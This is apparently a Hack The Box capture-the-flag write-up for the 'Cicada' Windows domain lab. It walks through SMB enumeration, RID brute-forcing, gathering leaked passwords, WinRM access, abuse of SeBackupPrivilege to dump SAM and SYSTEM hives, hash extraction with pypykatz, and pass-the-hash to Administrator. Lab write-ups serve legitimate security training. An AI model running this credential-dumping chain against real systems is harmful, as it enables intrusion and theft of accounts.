---
title: Cicada
date: 2025-01-25T09:26:06.000Z
draft: false
tags:
  - "#htb"
  - "#easy"
---


# Initial Recon
```bash
open ports

80 - http
445 - smb
```

### SMB recon
```
smbclient \\10.10.10.10\ -L 
```

```
Sharename       Type      Comment
 ---------       ----      -------
  ADMIN$          Disk      Remote Admin
   C$              Disk      Default share
  DEV             Disk      
  HR              Disk      
  IPC$            IPC       Remote IPC
 NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
 from HR share we got a file 
 Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

### netexec
it's run as a guest user on smb 
 ```
 nxc smb 10.10.10.10 -u '' --rid-brute
 ```
 
```
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson(SidTypeUser)  → default password for this we used just creds.txt files on netexec 
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser) -- users with the creds 
```

**Findings:**
```
 nxc smb 10.10.10.10 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

```
 445    CICADA-DC        david.orelious 2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
```

 Run a `--shares` scan on `netexe` or `smbmap` with david creds

---
```
nxc smb target -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```
download the output of the shares.. without using smbclient

 ---
# User flag
 Looked on DEV by smbclient which is readable by david user and we found a file which has 

```
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

```
nxc winrm 10.10.10.10 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
### evil-winrm

```
evil-winrm -i 10.10.10.10 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```


# Root 
Using creds to get a shell using evil-winrm and we see a privilege 

```
SeBackupPrivilege
```

 It is used to backup all folder with out admin permission 

-> so we downloaded sam and system from registry using 
```
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system 
```

-> download sam 
-> download system 

---
or 
```
nxc smb 10.10.10.10 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -M backup_operator
```
it can even extract data from registry 

or 
this also can extract data from registry
```
impacket-secretsdump
```

---

```bash
pypykatz registry --sam sam system 
```
→ pypykatz is the python implementation of mimikatz used to extract passwords from registry 

---
about the NTLM hash
[https://www.thehacker.recipes/ad/movement/ntlm/](https://www.thehacker.recipes/ad/movement/ntlm/ "https://www.thehacker.recipes/ad/movement/ntlm/")

---

```
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```bash
evil win-rm -i <ip> -u Administrator -H <hash> 
```

Gained `Root`


